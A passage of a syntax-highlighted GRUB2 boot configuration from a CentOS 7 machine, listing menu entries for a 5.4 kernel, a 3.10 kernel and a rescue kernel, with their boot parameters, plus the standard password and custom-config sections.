<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> video_bochs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> video_cirrus</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  fi</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">terminal_output</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> console</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_timeout_style</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ] ; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout_style=menu</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Fallback normal timeout code in case the timeout_style feature is</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># unavailable.</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/00_header ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/00_tuned ###</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tuned_params=""</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tuned_initrd=""</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/00_tuned ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/01_users ###</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-f</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">prefix</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/user.cfg ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  source</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">prefix</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/user.cfg</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">GRUB2_PASSWORD</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> superusers="root"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> superusers</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    password_pbkdf2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">GRUB2_PASSWORD</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  fi</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/01_users ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/10_linux ###</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">menuentry</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'CentOS Linux (5.4.119-19-0006) 7 (Core)'</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> centos</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu-linux</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> os</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --unrestricted</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $menuentry_id_option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'gnulinux-5.4.119-19-0006-advanced-a96bb1f6-5e36-4743-8e86-8d3810f5ba85'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	load_video</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gfxpayload=keep</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gzio</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part_msdos</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ext2</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root='hd0,msdos2'</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_platform_search_hint</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-bios=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-efi=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-baremetal=ahci0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'hd0,msdos2'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	else</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	fi</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	linux16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /vmlinuz-5.4.119-19-0006</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=UUID=a96bb1f6-5e36-4743-8e86-8d3810f5ba85</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ro</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mgag200.modeset=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ixgbe.allow_unsupported_sfp=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vga=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0x317</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> intel_iommu=on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iommu=pt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pci=realloc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nousbstorage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crashkernel=auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rhgb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> quiet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	initrd16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /initramfs-5.4.119-19-0006.img</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">menuentry</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'CentOS Linux (3.10.0-1160.el7.x86_64) 7 (Core)'</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> centos</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu-linux</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> os</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --unrestricted</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $menuentry_id_option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'gnulinux-3.10.0-1160.el7.x86_64-advanced-a96bb1f6-5e36-4743-8e86-8d3810f5ba85'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	load_video</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gfxpayload=keep</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gzio</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part_msdos</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ext2</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root='hd0,msdos2'</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_platform_search_hint</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-bios=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-efi=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-baremetal=ahci0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'hd0,msdos2'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	else</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	fi</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	linux16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /vmlinuz-3.10.0-1160.el7.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=UUID=a96bb1f6-5e36-4743-8e86-8d3810f5ba85</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ro</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mgag200.modeset=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ixgbe.allow_unsupported_sfp=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vga=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0x317</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> intel_iommu=on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iommu=pt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pci=realloc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nousbstorage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crashkernel=auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rhgb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> quiet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	initrd16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /initramfs-3.10.0-1160.el7.x86_64.img</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">menuentry</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'CentOS Linux (0-rescue-5737ebefe3cb44a2865fe1136b8df871) 7 (Core)'</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> centos</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu-linux</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> os</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --unrestricted</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $menuentry_id_option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'gnulinux-0-rescue-5737ebefe3cb44a2865fe1136b8df871-advanced-a96bb1f6-5e36-4743-8e86-8d3810f5ba85'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	load_video</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gzio</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part_msdos</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ext2</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root='hd0,msdos2'</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_platform_search_hint</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-bios=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-efi=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-baremetal=ahci0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'hd0,msdos2'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	else</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	fi</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	linux16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /vmlinuz-0-rescue-5737ebefe3cb44a2865fe1136b8df871</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=UUID=a96bb1f6-5e36-4743-8e86-8d3810f5ba85</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ro</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mgag200.modeset=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ixgbe.allow_unsupported_sfp=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vga=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0x317</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> intel_iommu=on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iommu=pt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pci=realloc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nousbstorage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crashkernel=auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rhgb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> quiet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	initrd16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /initramfs-0-rescue-5737ebefe3cb44a2865fe1136b8df871.img</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'CentOS Linux (5.4.119-19-0006) 7 (Core)'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> default</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'Advanced options for CentOS Linux&gt;CentOS Linux (5.4.119-19-0006) 7 (Core)'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/10_linux ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/20_linux_xen ###</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/20_linux_xen ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/20_ppc_terminfo ###</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/20_ppc_terminfo ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/30_os-prober ###</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/30_os-prober ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/40_custom ###</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># This file provides an easy way to add custom menu entries.  Simply type the</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># menu entries you want to add after this comment.  Be careful not to change</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># the 'exec tail' line above.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/40_custom ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/41_custom ###</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-f</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">  ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">config_directory</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/custom.cfg ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  source</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">config_directory</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/custom.cfg</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">elif</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-z</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">config_directory</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -f</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  $prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/custom.cfg ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
